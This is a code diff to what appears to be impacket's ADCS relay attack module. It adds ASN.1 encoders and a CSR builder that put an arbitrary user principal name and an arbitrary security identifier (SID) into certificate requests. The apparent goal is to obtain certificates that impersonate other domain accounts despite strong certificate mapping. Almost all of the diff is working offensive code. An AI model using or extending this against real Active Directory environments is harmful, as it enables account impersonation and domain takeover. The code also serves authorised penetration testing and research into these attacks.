@@ -23,14 +23,62 @@ import urllib.parse
 
 from cryptography import x509
 from cryptography.hazmat.primitives.serialization import pkcs12
-from cryptography.hazmat.primitives.serialization import NoEncryption
+from cryptography.hazmat.primitives.serialization import NoEncryption, Encoding
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.backends import default_backend
 from cryptography.x509 import ExtensionNotFound, load_pem_x509_certificate
 from cryptography.x509.oid import NameOID, ObjectIdentifier
-from cryptography.hazmat.backends import default_backend
-
-
 
 from impacket import LOG
+
+
+def _tlv(tag, value):
+    n = len(value)
+    if n < 0x80:
+        return bytes([tag, n]) + value
+    elif n < 0x100:
+        return bytes([tag, 0x81, n]) + value
+    else:
+        return bytes([tag, 0x82, (n >> 8) & 0xff, n & 0xff]) + value
+
+
+def _oid_encode(oid_str):
+    parts = [int(x) for x in oid_str.split('.')]
+    first = 40 * parts[0] + parts[1]
+
+    def arc(n):
+        if n < 128:
+            return bytes([n])
+        r = []
+        while n:
+            r.insert(0, n & 0x7f)
+            n >>= 7
+        for i in range(len(r) - 1):
+            r[i] |= 0x80
+        return bytes(r)
+
+    c = arc(first)
+    for p in parts[2:]:
+        c += arc(p)
+    return _tlv(0x06, c)
+
+
+def _encode_upn_san(upn):
+    """GeneralNames SEQUENCE containing OtherName[msUPN] = UTF8String(upn)"""
+    utf8 = _tlv(0x0c, upn.encode('utf-8'))
+    val  = _tlv(0xa0, utf8)
+    oid  = _oid_encode("1.3.6.1.4.1.311.20.2.3")
+    on   = _tlv(0xa0, oid + val)
+    return _tlv(0x30, on)
+
+
+def _encode_sid_ext(sid):
+    """szOID_NTDS_CA_SECURITY_EXT value: GeneralNames containing OtherName[NTDS_OBJECTSID]"""
+    oct_s = _tlv(0x04, sid.encode('utf-8'))
+    val   = _tlv(0xa0, oct_s)
+    oid   = _oid_encode("1.3.6.1.4.1.311.25.2.1")
+    on    = _tlv(0xa0, oid + val)
+    return _tlv(0x30, on)
 
 # cache already attacked clients
 ELEVATED = []
@@ -84,9 +132,13 @@ class ADCSAttack:
         else:
             LOG.info('Using template name: %s (%s)' % (current_template, original_template))
 
-        csr = self.generate_csr(key, self.username, self.config.altName)
+        altSid = getattr(self.config, 'altSid', None)
+        csr = self.generate_csr(key, self.username, self.config.altName, altSid=altSid)
         csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
-        LOG.info("CSR generated!")
+        if altSid:
+            LOG.info("CSR generated with SID extension: %s" % altSid)
+        else:
+            LOG.info("CSR generated!")
 
         certAttrib = self.generate_certattributes(current_template, self.config.altName)
 
@@ -142,20 +194,45 @@ class ADCSAttack:
             LOG.info("This certificate can also be used for user : {}".format(self.config.altName))
 
     @staticmethod
-    def generate_csr(key, CN, altName, csr_type = crypto.FILETYPE_PEM):
+    def generate_csr(key, CN, altName, csr_type=crypto.FILETYPE_PEM, altSid=None):
         LOG.info("Generating CSR...")
-        req = crypto.X509Req()
 
-        if CN:
-            req.get_subject().CN = CN
+        if altSid is None:
+            req = crypto.X509Req()
+            if CN:
+                req.get_subject().CN = CN
+            if altName:
+                req.add_extensions([crypto.X509Extension(b"subjectAltName", False,
+                    b"otherName:1.3.6.1.4.1.311.20.2.3;UTF8:%b" % altName.encode())])
+            req.set_pubkey(key)
+            req.sign(key, "sha256")
+            return crypto.dump_certificate_request(csr_type, req)
 
+        private_key = key.to_cryptography_key()
+        builder = x509.CertificateSigningRequestBuilder()
+        builder = builder.subject_name(x509.Name([
+            x509.NameAttribute(NameOID.COMMON_NAME, CN or "")
+        ]))
         if altName:
-            req.add_extensions([crypto.X509Extension(b"subjectAltName", False, b"otherName:1.3.6.1.4.1.311.20.2.3;UTF8:%b" %  altName.encode() )])
-
-        req.set_pubkey(key)
-        req.sign(key, "sha256")
-
-        return crypto.dump_certificate_request(csr_type, req)
+            builder = builder.add_extension(
+                x509.UnrecognizedExtension(
+                    oid=ObjectIdentifier("2.5.29.17"),
+                    value=_encode_upn_san(altName)
+                ),
+                critical=False
+            )
+        builder = builder.add_extension(
+            x509.UnrecognizedExtension(
+                oid=ObjectIdentifier("1.3.6.1.4.1.311.25.2"),
+                value=_encode_sid_ext(altSid)
+            ),
+            critical=False
+        )
+        csr = builder.sign(private_key, hashes.SHA256(), default_backend())
+        if csr_type == crypto.FILETYPE_PEM:
+            return csr.public_bytes(Encoding.PEM)
+        else:
+            return csr.public_bytes(Encoding.DER)
 
     @staticmethod
     def generate_pfx(key, certificate):
